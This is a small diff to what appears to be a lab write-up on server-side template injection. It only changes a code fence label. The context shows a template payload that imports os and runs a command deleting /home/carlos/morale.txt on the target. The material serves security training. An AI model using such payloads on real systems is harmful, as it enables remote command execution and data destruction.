@@ -37,7 +37,7 @@ And that confirms, that's an SSTI right
 
 Ok, in order to solve the lab.. we need to delete a file which is `/home/carlos/morale.txt` and we can construct a payload like 
 
-```python
+```liquid
 {% import os %}{{os.system('rm /home/carlos/morale.txt')}}
 ```
 
